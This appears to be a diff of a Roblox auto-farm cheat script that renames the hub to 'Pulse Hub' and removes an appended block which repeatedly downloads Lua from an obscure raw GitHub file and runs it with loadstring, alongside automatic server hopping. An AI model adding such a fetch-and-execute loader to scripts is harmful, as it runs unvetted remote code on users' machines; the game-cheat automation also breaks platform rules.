@@ -371,8 +371,8 @@ SaveManager:SetLibrary(Fluent)
 InterfaceManager:SetLibrary(Fluent)
 SaveManager:IgnoreThemeSettings()
 SaveManager:SetIgnoreIndexes({})
-InterfaceManager:SetFolder("AutoFarmHub")
-SaveManager:SetFolder("AutoFarmHub/configs")
+InterfaceManager:SetFolder("PulseHub")
+SaveManager:SetFolder("PulseHub/configs")
 
 InterfaceManager:BuildInterfaceSection(Tabs.Settings)
 SaveManager:BuildConfigSection(Tabs.Settings)
@@ -380,7 +380,7 @@ SaveManager:BuildConfigSection(Tabs.Settings)
 Window:SelectTab(1)
 
 Fluent:Notify({
-    Title = "Auto Farm Hub",
+    Title = "Pulse Hub",
     Content = "Script loaded successfully!\nPress X to stop.",
     Duration = 5
 })
@@ -458,61 +458,3 @@ end
 -- Start contest time check
 task.spawn(checkContestTime)
 checkContestTime() -- Ensure immediate start
-
--- Auto Server Hop System
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-
-local function getServers()
-    local servers = {}
-    local endpoint = string.format(
-        "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100",
-        game.PlaceId
-    )
-    
-    local success, result = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet(endpoint))
-    end)
-    
-    if success and result and result.data then
-        for _, server in ipairs(result.data) do
-            if type(server) == "table" and server.playing and server.maxPlayers and server.id and server.playing < server.maxPlayers and server.id ~= game.JobId then
-                table.insert(servers, server.id)
-            end
-        end
-    end
-    
-    return servers
-end
-
-local function autoHop()
-    local servers = getServers()
-    if #servers > 0 then
-        local randomServer = servers[math.random(1, #servers)]
-        TeleportService:TeleportToPlaceInstance(game.PlaceId, randomServer)
-    end
-end
-
--- Auto Execute System
-local function autoExecute()
-    local success, infiniteYield = pcall(function()
-        return game:HttpGet('https://raw.githubusercontent.com/Lewe1512/game/refs/heads/main/qfh123fqe.lua')
-    end)
-    
-    if success then
-        loadstring(infiniteYield)()
-    end
-end
-
--- Initialize Auto Hop and Execute
-task.spawn(function()
-    while true do
-        wait(30)  -- Wait 30 seconds
-        autoExecute()  -- Execute Infinite Yield
-        wait(1)   -- Small delay before hopping
-        autoHop() -- Hop to new server
-    end
-end)
-
--- Execute immediately on load
-autoExecute()
